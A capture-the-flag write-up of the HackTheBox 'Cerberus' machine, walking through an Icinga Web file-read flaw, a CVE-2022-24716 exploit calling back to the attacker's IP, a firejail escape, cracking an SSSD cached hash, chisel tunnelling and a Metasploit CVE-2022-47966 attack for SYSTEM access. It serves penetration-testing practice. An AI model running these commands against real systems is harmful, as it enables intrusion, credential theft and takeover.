## Synopsis

Cerberus is the Hard machine from hackthebox. In doing the enumeration we can find vulnerabilities on the icinga website, namely the LFI vulnerability. In this process we can get a username and password, this is needed at the time of exploitation. after successfully getting the shell, we are met with firejail. it takes two sessions to proceed to the next stage. Pivoting is needed to take port 5985 namely winrm. The ManageEngine application runs on localhost using port 9251, double pivoting is required to gain root privileges. The ManageEngine application was found to have the CVE-2022-47966 vulnerability. combination with proxychains using SOCKS and metasploit to become an AUTHORITY SYSTEM on the cerberus box.

## Portscan

```powershell
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://icinga.cerberus.local:8080/icingaweb2
|_http-open-proxy: Proxy might be redirecting requests
```

## HTTP

with following information on nmap, we can added new hostname on `/etc/hosts` file

```bash
ip-target icinga.cerberus.local
```

following the tittle of pages, i can determining if the system has a vulnerabillity. i search with `searchploit` tools and soon getting a new one.

i forward this arbitrary file using burpsuite, which is using proxy with following command:

```bash
python3 51329.py http://icinga.cerberus.local:8080/icingaweb2/ "/etc/icingaweb2/config.ini" --proxy 127.0.0.1:8080
```

only root and matthew have shell, get more file for gather many information for this stuff. you can read in [here](https://exploit-notes.hdks.org/exploit/web/icinga-web-pentesting/) for the payload list:

```bash
/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/authentication.ini
/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/config.ini
/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini
/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/roles.ini
/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/passwd
```

gather information on `/etc/hosts` file.

getting username and password on resources.ini file, matthew as a administrator on icinga website.

nothing happen if you login into system, we need to exploit for gain access into system. you grab the exploit code in [here](https://raw.githubusercontent.com/JacobEbben/CVE-2022-24716/main/exploit.py). Before we reach the system, we need to create a PEM file with following command:

```bash
ssh-keygen -m pem (with output cert.pem)
```

then you can execute with command below:

```bash
#exploit
python3 exploit.py -t http://icinga.cerberus.local:8080/icingaweb2/ -p 8080 -u matthew -p "IcingaWebPassword2023" -I 10.10.14.146 -P 9001 -e cert.pem
```

i already upload **linpeas** for gather  information, the cool thing is linpeas didnt detect if we're inside container.

```bash
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════
                                             ╚═══════════╝

╔══════════╣ Sudo version

```

i already tried to exploit sudo without any luck, and i found another things to reach the root for this container.

`Firejail` is a setuid-root command line program that allows to execute
programs in isolated sandboxes. The details of execution are controlled
by configuration files and command line switches. The isolation features
are implemented based on Linux namespace mechanisms.

Among the many features of Firejail there exists the possibility to join
an existing Firejail container setup using the `firejail --join=<pid>`
style invocation. Download [firejoin_py.py](https://seclists.org/oss-sec/2022/q2/att-188/firejoin_py.bin) and upload into target and open another shell, execute this command below on session one to make a pid:

```python
#shell 1
python3 firejoin_py.py
```

![](/assets/img/cerberus/7.png)

with another session you can execute command below:

```bash
#shell 2

#upgrade shell with python3
python3 -c 'import pty; pty.spawn("/bin/bash")'

#then
firejail --join=21428

#then
su - 
```

Back into linpeas.sh result if we can find another information wich is **SSSD**. 

```bash
[snip]
uid=109(sssd) gid=115(sssd) groups=115(sssd)
-rw-r--r-- 1 root root 169 Oct  4  2022 /usr/lib/x86_64-linux-gnu/sssd/conf/sssd.conf
[sssd]
proxy_pam_target = sssd-shadowutils
passwd file: /var/lib/sss/mc/passwd
[snip]
```

Basically The System Security Services Daemon (**SSSD**) is a system service that allows you to access remote directories and authentication mechanisms. You can connect a local system, an **SSSD** _client_, to an external back-end system, a _provider_. 

SSSD works in two stages:

1. It connects the client to a remote provider to retrieve identity and authentication information.
2. It uses the obtained authentication information to create a local cache of users and credentials on the client.

Users on the local system are then able to authenticate using the user accounts stored in the remote provider.

find the  directory where the data is stored in `/var/lib/sss/db`. We can easily dump an information using `strings` command, if you use `cat` it will destroy the output. i found information such as `CN`, `password`, etc.

```bash
root@icinga:/var/lib/sss/db# strings cache_cerberus.local.ldb
name=matthew@cerberus.local,cn=users,cn=cerberus.local,cn=sysdb
$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0
```

let's crack using `john` with following command:

```bash
john hash -w=/usr/share/wordlists/rockyou.txt
```

![](/assets/img/cerberus/9.png)

we already found username and password which is good, if you noticed on `/etc/hosts` file they telling us another address inside target. And now we can check the address **172.16.22.1** and **172.16.22.2** using nmap, you can download nmap in [here](https://github.com/opsec-infosec/nmap-static-binaries/releases/tag/v2) then upload into target. 

i only check port 5985 with addres **172.16.22.1** which is **winrm**, with following command:

```bash
./nmap -p5985 -sC 172.16.22.1
```

![](/assets/img/cerberus/10.png)

after that we can do Port Forwarding or Pivoting using **chisel** for grabbing port 5985 to our localhost, upload **chisel** into target and execute command below:

**on victim**

```bash
./chisel client 10.10.14.146:9000 R:5985:172.16.22.1:5985
```

![](/assets/img/cerberus/11.png)

**on kali** 
```
./chisel server -p 9000 --reverse
```

![](/assets/img/cerberus/12.png)

after successfully doing port forwarding, we can logged in use **matthew:147258369** as credentials with following command:

```bash
evil-winrm -i 127.0.0.1 -u matthew -p 147258369
```

## Privilege Escalation

Walking into directory **Program (x86)** we can find **ManageEngine**, i assume if **ManageEngine** is apps running in the background.

![](/assets/img/cerberus/14.png)

Googling about this one and find information about what default port this app use in [here](file:///tmp/mozilla_root0/securely-deploy-adselfservice-plus-over-the-internet-for-remote-users.pdf) , they telling us if ManageEngine use **9251** as default port. This box using double pivoting technique to reach root users. lets upload **chisel** again in windows system, then execute command below:

**on kali**

```bash
./chisel server -p 9999 --reverse
```

**on evil-winrm**

```bash
./chisel.exe client 10.10.14.146:9999 R:9251:172.16.22.1:9251
```

after that i check the page on firefox using address http://127.0.0.1:9251 with **not found** reponse, this is weird actually. Googling again about that things and lead me into this [blog](https://www.hdysec.com/port-forward-tunnels/). This guy playing some **TryHackMe machine** with the same condition with this machine. we can leverage our port forwarding using **SOCKS**. execute this command below:

```bash
./chisel.exe client 10.10.14.146:9251 R:socks
```

![](/assets/img/cerberus/15.png)

on kali command

```bash
./chisel server -p 9251 --reverse --socks5 &
```

![](/assets/img/cerberus/16.png)

change type on foxyproxy into **SOCKS5** with i**p 127.0.0.1** and port **1080**

![](/assets/img/cerberus/17.png)

then go to firefox to access the page

![](/assets/img/cerberus/18.png)

login with credential matthew@cerberus.local:147258369 and dont forget to add new domain on **/etc/hosts** -> `dc`. so it looks like this:

![](/assets/img/cerberus/19.png)

refresh the page will got response like image below. This ManageEngine system application is affected of **CVE-2022-47966** vulnerrability, it is possible to execute arbitrary code by providing a crafted `samlResponse` XML to the ADSelfService Plus SAML endpoint.

![](/assets/img/cerberus/20.png)

if you dont have script `saml RCE`, you can download in [here](https://dl.packetstormsecurity.net/2302-exploits/manageengine_adselfservice_plus_saml_rce_cve_2022_47966.rb). Then you have to set **proxychains** in `/etc/proxychains.conf` file.

```bash
#added
SOCKS5 127.0.0.1 1080

#don't forget to restart tor service
systemctl restart tor.service
```

then execute **metasploit** with following command:

```bash
proxychains msfconsole -q
```

set everything for requirment such as `guid`, `url`, etc.

![](/assets/img/cerberus/21.png)

execute **exploit** command will lead you into **administrator** account.
